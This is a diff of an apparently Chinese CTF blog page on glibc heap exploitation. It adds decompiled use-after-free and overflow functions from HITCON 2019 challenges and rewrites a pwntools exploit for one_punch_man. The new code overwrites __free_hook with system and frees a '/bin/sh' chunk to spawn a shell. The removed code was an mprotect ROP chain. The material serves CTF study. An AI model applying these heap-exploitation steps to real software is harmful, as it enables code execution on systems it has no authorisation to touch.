@@ -127,7 +127,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    6.4k 字
+                    6.5k 字
                   </span>
                 
 
@@ -529,6 +529,9 @@ int main() {
 <li>可以修改 Smallbins 中 Chunk 的 bk 字段。</li>
 </ol>
 <h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>记录一些漏洞相关的题目。在参考网站中记录了很多讲得很好的博客，这里对题目等的描述就直接略过了。</p>
+<blockquote>
+<p>在实际做题过程中发现 glibc-2.29 和 glibc-2.31 下的题目 IDA 不能很好地反编译 switch 语句，比较推荐用 Ghidra 或是 Cutter。</p>
+</blockquote>
 <h2 id="2019-HITCON-one-punch-man（tcache-stashing-unlink-attack）"><a href="#2019-HITCON-one-punch-man（tcache-stashing-unlink-attack）" class="headerlink" title="2019-HITCON-one_punch_man（tcache stashing unlink attack）"></a>2019-HITCON-one_punch_man（tcache stashing unlink attack）</h2><blockquote>
 <p>环境：Ubuntu 20.04（VMware Fusion）<br>原本程序加了 seccomp filter，因为主要是复现新技术，就将对应的代码 patch 掉了；同时题目中的隐藏函数只有在 tache 0x220 对应的 count 大于 6 时才能调用，但因为用的是 glibc-2.31 的环境，count 字段从 1 个字节变为了 2 个字节，偏移就对不上了，所以这里也把对应的 if 语句 patch 掉了。</p>
 </blockquote>
@@ -576,7 +579,19 @@ __int64 __fastcall punch(__int64 a1, __int64 a2)
   return puts(buf);
 }
 </code></pre>
-<p>依次泄漏 heap 和 libc，然后构造用于 tcache stashing unlink attack 的两个 smallbins，最后用 mprotect 改 heap 段的执行权限来跑 shellcode（不过话说 seccomp filter 被我 patch 了可以直接上 one_gadget）。Exploit：</p>
+<p>free 的时候存在 Use After Free：</p>
+<pre><code class="cpp">void __fastcall retire(__int64 a1, __int64 a2)
+{
+  unsigned int v2; // [rsp+Ch] [rbp-4h]
+
+  write_buf(&quot;idx: &quot;);
+  v2 = read_int();
+  if ( v2 &gt; 2 )
+    error((__int64)&quot;invalid&quot;);
+  free(*((void **)&amp;unk_4040 + 2 * v2));
+}
+</code></pre>
+<p>依次泄漏 heap 和 libc，然后构造用于 tcache stashing unlink attack 的两个 smallbins，最后就可以直接改 free_hook 为 system（因为我已经把 seccomp filter 给 patch 了）。Exploit：</p>
 <pre><code class="python">#!/usr/bin/env python3
 from pwn import *
 
@@ -676,21 +691,13 @@ edit(1, payload) # overwrite smallbins&#39; bk
 new(1, &#39;1&#39; * 0xf8) # unlink
 #gdb.attach(p)
 
-mprotect = libc_base + libc.symbols[&#39;mprotect&#39;]
-malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]
-add_rsp_0x48_ret = libc_base + next(libc.search(asm(&#39;add rsp, 0x48 ; ret&#39;)))
-pop_rdi_ret = libc_base + next(libc.search(asm(&#39;pop rdi ; ret&#39;)))
-pop_rsi_ret = libc_base + next(libc.search(asm(&#39;pop rsi ; ret&#39;)))
-pop_rdx_r12_ret = libc_base + next(libc.search(asm(&#39;pop rdx ; pop r12 ; ret&#39;)))
-ret = libc_base + next(libc.search(asm(&#39;ret&#39;)))
-info(&#39;malloc_hook_addr = &#39; + hex(malloc_hook))
-edit(0, p64(malloc_hook).ljust(0x217, b&#39;\x00&#39;)) # change tcache 0x220&#39;s fd =&gt; __malloc_hook
+free_hook_addr = libc_base + libc.symbols[&#39;__free_hook&#39;]
+system_addr = libc_base + libc.symbols[&#39;system&#39;]
+edit(0, p64(free_hook_addr).ljust(0x217, b&#39;\x00&#39;)) # change tcache 0x220&#39;s fd =&gt; __free_hook
 punch(&#39;punch&#39;) # get a chunk from tcache 0x220
-punch(p64(add_rsp_0x48_ret)) # get __malloc_hook from tcache 0x220
-info(&#39;add_rsp_0x48_ret = &#39; + hex(add_rsp_0x48_ret))
-#gdb.attach(p)
-payload = p64(pop_rdi_ret) + p64(heap_base + 0x2000) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0) + p64(mprotect) + p64(shellcode_addr)
-new(2, payload.ljust(0x408, b&#39;\x00&#39;))
+punch(p64(system_addr)) # get __free_hook from tcache 0x220
+new(2, b&#39;/bin/sh\x00&#39;.ljust(0x408, b&#39;\x00&#39;))
+free(2)
 p.interactive()
 </code></pre>
 <h2 id="2019-HITCON-lazyhouse（tcache-stashing-unlink-attack-plus）"><a href="#2019-HITCON-lazyhouse（tcache-stashing-unlink-attack-plus）" class="headerlink" title="2019-HITCON-lazyhouse（tcache stashing unlink attack plus）"></a>2019-HITCON-lazyhouse（tcache stashing unlink attack plus）</h2><blockquote>
@@ -715,7 +722,7 @@ p.interactive()
           qword_5060[3 * v1] = buf;
         }
 </code></pre>
-<p>upgrade 中可以多写 0x20 个字节，buy_super 是隐藏函数，调用 malloc：</p>
+<p>upgrade 中可以多写 0x20 个字节，可以 overflow 到下一个 Chunk 的 bk，buy_super 是隐藏函数，调用 malloc：</p>
 <pre><code class="cpp">void *upgrade()
 {
   __int64 v0; // ST08_8
@@ -940,6 +947,23 @@ __int64 execute()
            *((_QWORD *)buf + 8));
 }
 </code></pre>
+<p>漏洞同样是 edit 的时候可以多读 0x20 个字节，可以 overflow 到下一个 Chunk 的 bk：</p>
+<pre><code class="cpp">__int64 edit()
+{
+  int idx; // [rsp+Ch] [rbp-4h]
+
+  puts(&quot;just edit once!&quot;);
+  if ( !edit_flag )
+    failed();
+  printf(&quot;idx: &quot;);
+  idx = read_int_();
+  if ( !*((_QWORD *)&amp;unk_40A0 + 2 * idx) )
+    failed();
+  printf(&quot;content: &quot;);
+  read(0, *((void **)&amp;unk_40A0 + 2 * idx), *((_DWORD *)&amp;unk_40A8 + 4 * idx) + 0x20);
+  return (unsigned int)(edit_flag-- - 1);
+}
+</code></pre>
 <p>Exploit：</p>
 <pre><code class="python">#!/usr/bin/env python3
 from pwn import *
@@ -1069,6 +1093,11 @@ p.interactive()
               
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/05/17/macOS下使用Jekyll和Coding搭建博客/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>macOS下使用Jekyll和Coding搭建博客</span>
+                      </a>
                     
                   </div>
                   <div class="post-next col-12 col-md-6">
